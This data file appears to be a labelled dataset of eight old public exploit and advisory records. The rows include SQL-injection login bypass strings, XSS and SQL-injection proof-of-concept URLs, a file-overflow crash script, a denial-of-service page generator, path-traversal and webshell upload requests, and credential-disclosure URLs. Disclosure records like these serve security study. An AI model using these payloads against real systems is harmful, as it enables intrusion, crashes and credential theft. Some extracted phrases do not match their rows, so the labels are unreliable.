38879,Etoshop B2B Vertical Marketplace Creator - Multiple SQL Injections source: https://www.securityfocus.com/bid/64332/info  B2B Vertical Marketplace Creator is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied input before using it in an SQL query.  An attacker can exploit these issues by manipulating the SQL query logic to carry out unauthorized actions on the underlying database.  B2B Vertical Marketplace Creator 2.0 is vulnerable; other version may also be vulnerable.   www.example.com/demo/B2BVerticalMarketplace/admin.asp  UserID : 1' or '1' = '1 Password : 1' or '1' = '1,manipulating the SQL query logic to carry out unauthorized actions on the underlying database,1
19597,"Guestbook Scripts PHP 1.5 - Multiple Vulnerabilities Title: ====== GuestBook Scripts PHP v1.5 - Multiple Web Vulnerabilites   Date: ===== 2012-06-11   References: =========== http://www.vulnerability-lab.com/get_content.php?id=601   VL-ID: ===== 601   Common Vulnerability Scoring System: ==================================== 7.5   Introduction: ============= GuestBook Script PHP is a script that is very easy to install, administer and use on your website. Visitors to your website can leave comments and feedback. Also you can use it for testimonials. Features of GuestBook Script PHP:      password protected administrator page     converts easily to any language     full control over the visual style     simple one step installation     easy to place on your webpage - copy and paste a single line of code     select only the fields that you want to appear on the GuestBook form     ability to set mandatory(required) fields on the GuestBook form     each comment poster will be able to upload own photo (icon/avatar)     rating stars option for the feedback     emoticons support with show/hide option     limit the number of characters in the comment area     set the number of comments per page     sort the order of entries     create a list of words that will be banned from the GuestBook     create a list of IP addresses that will be banned from using the GuestBook     prevention of HTML and javascript injections     choose between two types of captcha antispam code - simple and reCaptcha     100% stop spam by using the reCaptcha image     different captcha image themes to suit your website colors     ability to approve comments/feedback before they are viewed publicly     edit email address where all new entries notifications will be sent to     option to send   thank you message to the commenter after posting     RSS Feed validated by W3C     full source code supplied  Requirements: PHP 4.3 or higher and MySQL 3 or higher running on your webserver. Current stable version of GuestBook Script PHP is 1.5  ( Copy of the Vendor Homepage: http://www.guestbookscripts.com )   Abstract: ========= The Vulnerability Laboratory Research Team discovered multiple different web vulnerabilites in GuestBook Scripts PHP 1.5 CMS.    Report-Timeline: ================ 2012-06-11:    Public or Non-Public Disclosure   Status: ======== Published   Exploitation-Technique: ======================= Remote   Severity: ========= High   Details: ======== 1.1 Multiple SQL Injection vulnerabilities  are detected in the GuestBook Scripts PHP 1.5 Content Management System. The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands on the affected application dbms without user inter action. Successful exploitation of the vulnerability results in dbms & application compromise. The vulnerabilities are located in the guestbook.php or admin.php files and the bound parameters p, orderType & orderBy. The sql injection vulnerabilities can be exploited by remote attackers without user inter action & without privileged user account.  Vulnerable File(s):             [+] guestbook.php             [+] admin.php   Vulnerable Parameter(s):             [+] orderType             [+] p             [+] orderBy    1.2 Multiple non persistent cross site scripting vulnerabilities are detected in the GuestBook Scripts PHP 1.5 Content Management System. The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with high required user inter action or local low privileged user account. The vulnerabilities are located in the admin.php file with the bound vulnerable search, p & ordertype parameters. Successful exploitation can result in account steal, phishing & client-side content request manipulation.  Vulnerable File(s):             [+] admin.php  Vulnerable Parameter(s):             [+] search             [+] p             [+] orderType   Proof of Concept: ================= 1.1 The SQL Injection vulnerabilities can be exploited by remote attackers with and without privileged user account. User inter action is not required for exploitation. For demonstration or reproduce ...  http://127.0.0.1:80/cms/guestbook.php?p=[SQL-INJECTION] http://127.0.0.1:80/cms/guestbook/admin.php?act=comments&orderType=[ASC/DESC]&search=&orderBy=[SQL-INJECTION] http://127.0.0.1:80/cms/guestbook/admin.php?act=comments&orderType=[SQL-INJECTION]  1.2 The persistent vulnerabilities can be exploited by remote attackers without privileged user account & with low required user inter action. For demonstration or reproduce ...  http://127.0.0.1:80/cms/guestbook/admin.php?act=comments&orderType=[ASC/DESC]&search=&orderBy=[CROSS SITE SCrIPTING] http://127.0.0.1:80/cms/guestbook/admin.php?act=comments&orderType=[ASC/DESC]&search=[CROSS SITE SCrIPTING] http://127.0.0.1:80/cms/guestbook/admin.php?act=comments&orderType=[CROSS SITE SCrIPTING]   Risk: ===== 1.1 The security risk of the sql injection vulnerabilities are estimated as high.  1.2 The security risk of the input validation vulnerabilities are estiamted as low(+)   Credits: ======== Vulnerability Laboratory [Research Team]  -    snup (snup@vulnerability-lab.com) [http://snup1.blogspot.com]    Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.  Domains:    www.vulnerability-lab.com       - www.vuln-lab.com Contact:    admin@vulnerability-lab.com     - support@vulnerability-lab.com     - research@vulnerability-lab.com Section:    video.vulnerability-lab.com     - forum.vulnerability-lab.com         - news.vulnerability-lab.com Social:        twitter.com/#!/vuln_lab     - facebook.com/VulnerabilityLab     - youtube.com/user/vulnerability0lab  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed), modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.                              Copyright � 2012 Vulnerability-Lab  --  VULNERABILITY RESEARCH LABORATORY TEAM Website: www.vulnerability-lab.com Mail: research@vulnerability-lab.com",using the reCaptcha image different captcha image themes,1
8107,"PenPal 2.0 - Authentication Bypass @~~=======================================~~@ ====C4TEAM.ORG====ByALBAYX====C4TEAM.ORG===== @~~=======================================~~@ @~~=Author   : ByALBAYX  @~~=Website  : WWW.C4TEAM.ORG  @~~=From     : Turkish @~~=======================================~~@ @~~=Script   :PenPal v2.0  @~~=S.Site   :http://anblik.com  @~~=Download :http://www.anblik.com/store/asp-scripts/penpal.html  @~~=Demo     :http://penpal.ankoor.com  @~~=Price    :1200.00 USD @~~=======================================~~@  @~~=Exploit:  @~~=Username: ' or '1=1  @~~=Password: ' or '1=1   @~~=http://c4team.org /PenPal v2.0_Path /admin/login.asp   @~~=Demo:  @~~=http://penpal.ankoor.com/admin/login.asp  vs.. @~~=======================================~~@ @~~=Greetz For    @~~=Str0ke & Kralman & Mrabah12R & K3vin Mitnick & web-terrorist & Silent & SpotGang @~~=======================================~~@ Derdimi dinledim, derdimden iGRENDiM... Onun derdini gordum, derdime iMRENDiM... FilistiN @~~=======================================~~@  # milw0rm.com [2009-02-25]",malicious users,1
27026,"Intel Graphics Accelerator Driver - Remote Denial of Service source: https://www.securityfocus.com/bid/16127/info  The Intel Graphics Accelerator driver is susceptible to a remote denial of service vulnerability. This issue is demonstrated to occur when the affected driver attempts to display an overly long text in a text area.  This issue allows attackers to crash the display manager on Microsoft Windows XP, or cause a complete system crash on computers running Microsoft Windows 2000. Other operating systems where the affected display driver is available are also likely affected.  Version 6.14.10.4308 of the Intel Graphics Accelerator driver is considered vulnerable to this issue. Other versions may also be affected.  This issue will be updated as further information becomes available. This issue may be related to the one described in BID 10913 (Microsoft Windows Large Image Processing Remote Denial Of Service Vulnerability), but this has not been confirmed.   <script>window.open(""http://aa..."");</script>  Where the 'a's are repeated approximately 53000 times.  Casiamo <casiamo@gmail.com> has provided the following HTML script code to create an HTML file that demonstrates the exploitation of this vulnerability:  html = open(""firefox.html"", ""w"") buff = 'A' * 50000 html.write(""<html><head>\n"" ""<script type=\""text/javascript\"">\n"" ""function bookmarksite(title, url){\n"" ""if (document.all)\n"" ""window.external.AddFavorite(url, title);\n"" ""else if (window.sidebar)\n"" ""window.sidebar.addPanel(title, url, \""\"")}\n"" ""</script></head>\n"" ""<body onload=\""javascript:bookmarksite('""+buff+""', 'http://www.mozilla.org')\"" >\n"" ""</body></html>"") html.close()",display an overly long text in a text area,1
9124,"Playlistmaker 1.5 - '.m3u' / '.M3L' / '.TXT' Local Stack Overflow (PoC)  #!/usr/bin/perl # ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### ## ## ## ## ### ## ## # #   Playlistmaker v1.5   (.M3U/M3L/Txt File) Local Stack Overflow POC        ## # #  Download: http://proletsoft.freeservers.com/mmb/playlistmaker.html        ## ## Welcom Back Milw0rm                                                         ## # ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### ## ## ## ## ### ## ## my $crash=""\x41"" x 5000 ; open(myfile,'>>PoC.m3u');# M3U/M3L/Txt print myfile $crash; ################################################################################## #By ThE g0bL!N #Usgae:open existing Plylis => Poc.m3u => Click On file => Boom!!! # Ismail Fiha seh :) Mada Bik Anta 1st Thotha :) ##################################################################################  # milw0rm.com [2009-07-11]",a specially crafted .m3u file,1
18814,"MyClientBase 0.12 - Multiple Vulnerabilities Title: ====== MyClientBase v0.12 - Multiple Web Vulnerabilities   Date: ===== 2012-04-30   References: =========== http://www.vulnerability-lab.com/get_content.php?id=511   VL-ID: ===== 511   Introduction: ============= MyClientBase is a simple, intuitive, free and open source web based invoice management  system developed with freelancers in mind. MCB is and always will be a community driven  project which aims to provide freelancers with a simple and intuitive invoice management  system. Please consider contributing your ideas, suggestions, comments, etc! MyClientBase  is designed to manage your clients and invoices as simply as possible. Every feature  included is aimed to benefit every user - not just one or two. Many of the features you`ll  find in MyClientBase were suggested by the community. Those suggestions that benefit the  community as a whole are what makes MyClientBase the successful project that it is.  - Community driven - Completely web-based - Unlimited everything - Configurable taxes - Multi-language support - Editable invoice templates - Client access through Client Center - Collect payments online - Inventory tracking  (Copy of the Vendor Homepage: http://myclientbase.com/ )   Abstract: ========= A Vulnerability Laboratory Researcher Team discovered multiple Web Vulnerabilities in MyClientBase v0.12 application.   Report-Timeline: ================ 2012-04-30:	Public or Non-Public Disclosure   Status: ======== Published   Exploitation-Technique: ======================= Remote   Severity: ========= Critical   Details: ======== 1.1 Multiple remote SQL Injection vulnerabilities are detected in the MyClientBase Content Management System v0.12.  The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands  on the affected application dbms. Successful exploitation of the vulnerability results in dbms & application  compromise. The vulnerability is located on invoice & tag when processing to request the invoice search module function  of the content management system. The technqiue behind is a easy order by injection mdb   Vulnerable Module(s): 					[+] Invoice Search - invoice# & tags   --- SQL Exception Logs ---  A Database Error Occurred Error Number: 1054  Unknown column `1` in `where clause`  SELECT SQL_CALC_FOUND_ROWS mcb_invoices.*, mcb_invoice_amounts.*, mcb_clients.*, mcb_users.username,  mcb_users.company_name AS from_company_name, mcb_users.last_name AS from_last_name, mcb_users.first_name  AS from_first_name, mcb_users.address AS from_address, mcb_users.address_2 AS from_address_2, mcb_users.city  AS from_city, mcb_users.state AS from_state, mcb_users.zip AS from_zip, mcb_users.country AS from_country,  mcb_users.phone_number AS from_phone_number, mcb_users.email_address AS from_email_address, mcb_users. web_address AS from_web_address, mcb_invoice_statuses.*, IF(mcb_invoice_statuses.invoice_status_type <>  3, IF(mcb_invoices.invoice_due_date < UNIX_TIMESTAMP(), 1, 0), 0) AS invoice_is_overdue, (DATEDIFF(FROM_UNIXTIME (UNIX_TIMESTAMP()), FROM_UNIXTIME(mcb_invoices.invoice_due_date))) AS invoice_days_overdue, mcb_users.tax_id_number  AS from_tax_id_number FROM (mcb_invoices) LEFT JOIN mcb_invoice_statuses ON mcb_invoice_statuses.invoice_status_id  = mcb_invoices.invoice_status_id LEFT JOIN mcb_users ON mcb_users.user_id = mcb_invoices.user_id JOIN  mcb_invoice_amounts ON mcb_invoice_amounts.invoice_id = mcb_invoices.invoice_id JOIN mcb_clients ON mcb_clients. client_id = mcb_invoices.client_id WHERE `mcb_invoices`.`invoice_is_quote` = 0 AND `mcb_invoices`.`invoice_id`  IN (SELECT invoice_id FROM mcb_invoice_tags WHERE tag_id IN (SELECT tag_id FROM mcb_tags WHERE tag IN(`-1`))) AND  `1` = `mcb_invoices.invoice_number LIKE  `%-1 `% `` AND mcb_invoices.client_id IN (`2`) ORDER BY mcb_invoices. invoice_date_entered DESC, mcb_invoices.invoice_id DESC LIMIT 15  Filename: 	/home/[USER]/public_html/[SERVICE]/myclientbase/core/MY_Model.php Line Number: 	92  ---  A Database Error Occurred Error Number: 1064  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right  syntax to use near `%` AND mcb_invoices.client_id IN (`1`) ORDER BY mcb_invoices.invoice_date_enter` at line 9  SELECT SQL_CALC_FOUND_ROWS mcb_invoices.*, mcb_invoice_amounts.*, mcb_clients.*, mcb_users.username, mcb_users. company_name AS from_company_name, mcb_users.last_name AS from_last_name, mcb_users.first_name AS from_first_name,  mcb_users.address AS from_address, mcb_users.address_2 AS from_address_2, mcb_users.city AS from_city, mcb_users.state  AS from_state, mcb_users.zip AS from_zip, mcb_users.country AS from_country, mcb_users.phone_number AS from_phone_number,  mcb_users.email_address AS from_email_address, mcb_users.web_address AS from_web_address, mcb_invoice_statuses.*,  IF(mcb_invoice_statuses.invoice_status_type <> 3, IF(mcb_invoices.invoice_due_date < UNIX_TIMESTAMP(), 1, 0), 0) AS  invoice_is_overdue, (DATEDIFF(FROM_UNIXTIME(UNIX_TIMESTAMP()), FROM_UNIXTIME(mcb_invoices.invoice_due_date))) AS  invoice_days_overdue, mcb_users.tax_id_number AS from_tax_id_number FROM (mcb_invoices) LEFT JOIN mcb_invoice_statuses  ON mcb_invoice_statuses.invoice_status_id = mcb_invoices.invoice_status_id LEFT JOIN mcb_users ON mcb_users.user_id =  mcb_invoices.user_id JOIN mcb_invoice_amounts ON mcb_invoice_amounts.invoice_id = mcb_invoices.invoice_id JOIN mcb_clients  ON mcb_clients.client_id = mcb_invoices.client_id WHERE `mcb_invoices`.`invoice_is_quote` = 0 AND `mcb_invoices`.` invoice_number` LIKE `%-1`%` AND mcb_invoices.client_id IN (`1`) ORDER BY mcb_invoices.invoice_date_entered DESC,  mcb_invoices.invoice_id DESC LIMIT 15  Filename: /home/[USER]/public_html/[SERVICE]/myclientbase/core/MY_Model.php  Line Number: 92 -- A Database Error Occurred Error Number: 1054 Unknown column `137` in `where clause`  SELECT SQL_CALC_FOUND_ROWS mcb_invoices.*, mcb_invoice_amounts.*, mcb_clients.*, mcb_users.username, mcb_users.company_name  AS from_company_name, mcb_users.last_name AS from_last_name, mcb_users.first_name AS from_first_name, mcb_users.address  AS from_address, mcb_users.address_2 AS from_address_2, mcb_users.city AS from_city, mcb_users.state AS from_state,  mcb_users.zip AS from_zip, mcb_users.country AS from_country, mcb_users.phone_number AS from_phone_number, mcb_users. email_address AS from_email_address, mcb_users.web_address AS from_web_address, mcb_invoice_statuses.*, IF(mcb_invoice_statuses. invoice_status_type <> 3, IF(mcb_invoices.invoice_due_date < UNIX_TIMESTAMP(), 1, 0), 0) AS invoice_is_overdue, (DATEDIFF (FROM_UNIXTIME(UNIX_TIMESTAMP()), FROM_UNIXTIME(mcb_invoices.invoice_due_date))) AS invoice_days_overdue, mcb_users.tax_id_number  AS from_tax_id_number FROM (mcb_invoices) LEFT JOIN mcb_invoice_statuses ON mcb_invoice_statuses.invoice_status_id =  mcb_invoices.invoice_status_id LEFT JOIN mcb_users ON mcb_users.user_id = mcb_invoices.user_id JOIN mcb_invoice_amounts ON  mcb_invoice_amounts.invoice_id = mcb_invoices.invoice_id JOIN mcb_clients ON mcb_clients.client_id = mcb_invoices.client_id  WHERE `mcb_invoices`.`invoice_is_quote` = 0 AND `mcb_invoices`.`invoice_id` IN (SELECT invoice_id FROM mcb_invoice_tags WHERE  tag_id IN (SELECT tag_id FROM mcb_tags WHERE tag IN(`-1`))) AND `1` = `mcb_invoices.invoice_number LIKE  `%g% `` AND ` mcb_invoice_amounts`.`invoice_total` = `2` AND mcb_invoices.client_id IN (`1`) ORDER BY mcb_invoices.invoice_date_entered  DESC, mcb_invoices.invoice_id DESC LIMIT 15  Filename: /home/[USER]/public_html/[SERVICE]/myclientbase/core/MY_Model.php Line Number: 92   Pictures(s): 					../1.png 					../2.png 					../3.png   1.2 Multiple persistent input validation vulnerabilities are detected in the MyClientBase Content Management System v0.12.  The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).  Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent)  context manipulation. Exploitation requires low user inter action. The vulnerability is located on the username  input fields first- or lastname & affects the user account listing on the admin section.                                          Vulnerable Module(s): 					[+] User accounts - Add first & lastname - index.php/users/form/user_id/2 					   [-] User Account Listing - first & lastname - myclientbase/index.php/users  Pictures(s): 					../4.png 					../5.png   Proof of Concept: ================= 1.1 The sql injection vulnerabilities can be exploited by remote attackers without user inter action. For demonstration or reproduce ...  URL: 		http://xxx.com/myclientbase/index.php/invoice_search METHOD:		POST INJECTION TYPE:	Order by -- MODULE:		invoice# via invoice_number & tags  Review: Vulnerable Input File <dl> <dt><label>Invoice #: </label></dt> <dd><input name=""invoice_number"" value="""" type=""text""></dd> </dl> ... & <dl> <dt><label>Tags: </label></dt> <dd><input id=""tags"" name=""tags"" value="""" type=""text""></dd> </dl>  PoC: POSTDATA= invoice_number=-1%27[SQL-Injection]&from_date=&to_date=&client_id%5B%5D=1&amount_operator=%3D&amount=2&tags=buh&output_type=index&btn_search=Search  ... or invoice_number=test&from_date=&to_date=&client_id%5B%5D=1&amount_operator=%3D&amount=2&tags=-1%27[SQL-Injection]&output_type=index&btn_search=Search   ci_session=a%3A11%3A%7Bs%3A10%3A%22 session_id%22%3Bs%3A32%3A%2248cebf507f1d7cbc8dd09fc127f16acb%22%3Bs%3A10%3A%22 ip_address%22%3Bs%3A11%3A%2286.32.63.91%22%3Bs%3A10%3A%22 user_agent%22%3Bs%3A50%3A%22Mozilla%2F5.0+%28Windows+NT+6.1%3B+WOW64%3B+rv%3A11.0%29+Gecko%22%3Bs%3A13%3A%22 last_activity%22%3Bi%3A1334351916%3Bs%3A7%3A%22 user_id%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22 last_name%22%3Bs%3A4%3A%22User%22%3Bs%3A10%3A%22 first_name%22%3Bs%3A5%3A%22Admin%22%3Bs%3A12%3A%22 global_admin%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22 is_admin%22%3Bb%3A1%3Bs%3A10%3A%22 last_index%22%3Bs%3A80%3A%22 invoice_search%2Fsearch_results%2F index%2F search_hash%2F8389e50abcfbd64f85d756ed6ab0205e%22%3Bs%3A11%3A%22 search_hash%22%3Ba%3A1%3A%7Bs%3A32%3A%228389e50abcfbd64f85d756ed6ab0205e%22%3Ba%3A2%3A%7Bs%3A5%3A% 22where%22%3Ba%3A3%3A%7Bs%3A29%3A%22mcb_invoices.invoice_is_quote%22%3Bi%3A0%3Bi%3A0%3Bs%3A133%3A%22mcb_invoices. invoice_id+IN+%28SELECT+invoice_id+FROM+mcb_invoice_tags+WHERE+tag_id+IN+%28SELECT+tag_id+FROM+mcb_tags+WHERE+ tag+IN%28%27-1%27%29%29%29%22%3Bi%3A1%3Bs%3A40%3A%22mcb_invoices.invoice_number+LIKE+%27%25-1%27%25%27%22%3B%7Ds %3A8%3A%22where_in%22%3Ba%3A1%3A%7Bs%3A22%3A%22mcb_invoices.client_id%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%222%22%3B% 7D%7D%7D%7D%7D4b78e5e505d94a46962e42792c6df0b8   1.2 The persistent input validation vulnerabilities can be exploited by remote attackers with low required user inter action. For demonstration or reproduce ...  Input URL: 	http://xxx.com/myclientbase/index.php/users/form/user_id/2 Affected URL: 	http://xxx.com/myclientbase/index.php/users  Review: user Accounts - Listing  <table> <tbody><tr> 		<th scope=""col"" class=""first"">ID</th> 		<th scope=""col"">Name</th> 		<th scope=""col"">Company Name</th> 		<th scope=""col"">Email</th> 		<th scope=""col"">Phone Number</th> 		<th scope=""col"" class=""last"">Actions</th> 		</tr> 			<tr> <td class=""first"">2</td> <td>""><iframe src=""a"" onload='alert(""VulnerabilityLab"")' <,="""" ""="""">< iframe src=a onload=alert(""VulnerabilityLab"") <</td> 					<td></td>   Risk: ===== 1.1 The security risk of the remote sql injection vulnerabilities are estimated as critical.  1.2 The security risk of the persistent input validation vulnerability is estimated as medium(+).   Credits: ======== Vulnerability Research Laboratory  Team  -    Benjamin Kunz Mejri (Rem0ve)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability- Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of  other media, are reserved by Vulnerability-Lab or its suppliers.      						Copyright � 2012 Vulnerability-Lab     --  VULNERABILITY RESEARCH LABORATORY TEAM Website: www.vulnerability-lab.com Mail: research@vulnerability-lab.com",malicious script code,1
24466,"WirelessFiles 1.1 iPad iPhone - Multiple Vulnerabilities Title: ====== WirelessFiles v1.1 iPad iPhone - Multiple Web Vulnerabilities   Date: ===== 2013-02-06   References: =========== http://www.vulnerability-lab.com/get_content.php?id=847   VL-ID: ===== 848   Common Vulnerability Scoring System: ==================================== 7.5   Introduction: ============= This application starts a web server on your device and allows downloads and uploads of any files from it using any browser on any  other computer or device. No cables, drivers or clients are necessary, just a browser.  Right from this application you can send these files to any other application ready to accept this file type. Or, you can send the  files to Wireless Files for further download to your computer. There is no problems with national file names. With this program You have web access to photos and videos on your device. Show your photos in a nice Web Album on big screen without  cables and so on. For that, you need to enter your web-server from any computer using LAN or WWAN address. Just type one of the  indicated addresses in the address bar of your browser (Internet Explorer, Mozilla Firefox, Safari or any others). Also, you can start  WirelessFiles on one device, enter the web-server in your browser from another device, and transfer your photos,for example,to the  first device, and then put them in Camera Roll. (The transfer of photos to and from Camera Roll is available only in iOS 6 and up). For all this to work, you need to have a working connection to the network where your device is located.  For LAN,It usually works right on the spot, if you have a modem or Wi-Fi router. If you have an AccessPoint (AP) connected to your  modem or router, you will need to switch the AP to the bridge mode in order to join the local network and Wi-Fi network into one. In  case you experience problems with connection, contact a specialist – this can be easily adjusted. It’s much harder with WWAN. It’s a  network access point provided by your cell network operator. As a rule, you cannot connect your computer to your device using WWAN.  Still, if Internet access on your computer is provided by the same operator, everything will get connected and running.  The application wouldn’t work in the background, so it switches off autoblocking while running. Any unexpected calls will  interrupt your file transfer. By default, the application allows storing a limited number of files – no more than 3 of them;  with the size of each not more than 10 MB. But you can remove all these limitations at the minimal price of $0.99 / €0.89. Second limitation - program show only 10 first photos in webalbum, remove this limitation - $0.99 / €0.89.  Still, if something isn’t working, DO NOT buy removal of restrictions – this will not improve operability of the system itself.  Pay ONLY in case everything works, and you need to store more than 3 files or larger size. The application include basic protection  of the web-server from unauthorized access.  (Copy of the Homepage: https://itunes.apple.com/de/app/wirelessfiles/id573161053 )   Abstract: ========= The Vulnerability Laboratory Research Team discovered a local file include vulnerability in the mobile WirelessFiles v1.1 app for the apple ipad & iphone.   Report-Timeline: ================ 2013-02-06:	Public Disclosure   Status: ======== Published   Affected Products: ================== Apple AppStore Product: WirelessFiles Application - (iPad & iPhone) 1.1   Exploitation-Technique: ======================= Remote   Severity: ========= High   Details: ======== A local file include web vulnerability via POST request method is detected in the mobile WirelessFiles v1.1 app for the apple ipad & iphone. The vulnerability allows remote attackers via POST method to inject local app webserver folders to request unauthorized local webserver files.  1.1 The main vulnerbility is located in the upload file submit formular of the webserver (http://192.168.0.10/) when processing to load a manipulated  filename via POST. The execution of the injected path or file request will occur when the attacker is watching the file index listing.  1.2 Attackers can also unauthorized implement mobile webshells by using a double filename extension (bild.js.php.jpg) when processing to upload (submit)  via POST request method. The attacker uploads a file with a double extension and access the file in the secound step via directory webserver listing  to compromise the apple iphone or ipad.  Exploitation of the local file include web vulnerability does not require user interaction but a low privileged user account (standard pass blank). Successful exploitation of the local web vulnerability results in ipad or iphone compromise via file include attack.   Vulnerable Application(s): 				[+] WirelessFiles - ITunes or AppStore (Apple)  Vulnerable Module(s): 				[+] File Upload via Submit (Web Server) [Remote]  Vulnerable Parameter(s): 				[+] filename  Affected Module(s): 				[+] Filename - Listing 				[+] Webalbum Filename  - Listing   Proof of Concept: ================= 1.1 The vulnerability can be exploited by remote attackers with low privileged application user account and without required user interaction. For demonstration or reproduce ...  Local File Include - PoC (POST)  POSTDATA =-----------------------------200962619920015 Content-Disposition: form-data; name=""value""; filename=""../../../../cmd>home>tmp.png""               # < Include Path & File Content-Type: image/png -- Authorization=Digest username=""ben37"", realm=""defaultRealm@host.com"", nonce=""2D2E8D09-6502-4266-B95E-28EB15CA8896"", uri=""/"",  response=""9942037c9ddae787f56cadcdb7570c89"", qop=auth, nc=00000014, cnonce=""9cb396be6aa86cb3""   Review: Filename - (Upload) Listing  <tbody><tr class=""styleZag""> <th scope=""col"" width=""50%""><div align=""left"">   File Name</div></th>               <th scope=""col"" width=""25%""><span>Date and Time</span></th>               <th scope=""col"" width=""25%""><div align=""right"">Size</div></th>           </tr>             <tr class=""styleRow""> <th scope=""col"" width=""50%""><div align=""left"">    <a href=""http://192.168.0.10/../../../../cmd>home>tmp.png?%00""> <../../../../cmd>home>tmp.png?%00"">%20%20%20%20</a></div></th>    1.2  The vulnerability can be exploited by remote attackers with low privileged application user account and without required user interaction. For demonstration or reproduce ...  Unauthroized File Upload/Access (Webshell)  POSTDATA =-----------------------------200962619920015 Content-Disposition: form-data; name=""value""; filename=""hacking.js.php.jpg""               # < Include File with multiple file extensions Content-Type: image/png -- Authorization=Digest username=""ben38"", realm=""defaultRealm@host.com"", nonce=""2D2E8D09-6502-4266-B95E-28EB15CA8896"", uri=""/"",  response=""9942037c9ddae787f56cadcdb7570c89"", qop=auth, nc=00000014, cnonce=""9cb396be6aa86cb3""  Review: Filename - (Upload) Listing  <tbody><tr class=""styleZag""> <th scope=""col"" width=""50%""><div align=""left"">   File Name</div></th>               <th scope=""col"" width=""25%""><span>Date and Time</span></th>               <th scope=""col"" width=""25%""><div align=""right"">Size</div></th>           </tr>             <tr class=""styleRow""> <th scope=""col"" width=""50%""><div align=""left"">    <a href=""http://192.168.0.10/hacking.js.php.jpg""><a href=hacking.js.php.jpg></a>%20%20%20%20</a></div></th>   Risk: ===== The security risk of the local file include web vulnerability and unauthorized file upload/access bug are estimated as high(+).   Credits: ======== Vulnerability Laboratory [Research Team]  -    Benjamin Kunz Mejri (bkm@vulnerability-lab.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright © 2012 | Vulnerability Laboratory    --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",inject local app webserver folders to request unauthorized local webserver files,1
32258,AWStats 6.8 - 'AWStats.pl' Cross-Site Scripting source: https://www.securityfocus.com/bid/30730/info  AWStats is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  AWStats 6.8 is vulnerable; other versions may also be affected.   http://www.example.com/awstats/awstats.pl?config=www.example.com&%22onload=%22alert(document.domain)//,a specially crafted .pl file,1
24700,Netbilling NBMEMBER Script - Information Disclosure source: https://www.securityfocus.com/bid/11504/info  Netbilling 'nbmember.cgi' script is reported prone to an information disclosure vulnerability. This issue may allow remote attackers to gain access to user authentication credentials and potentially sensitive configuration information.  http://www.example.com/cgi-bin/nbmember.cgi?cmd=test http://www.example.com/cgi-bin/nbmember.cgi?cmd=list_all_users&keyword=hereistheaccesskeyword,a malicious user,1
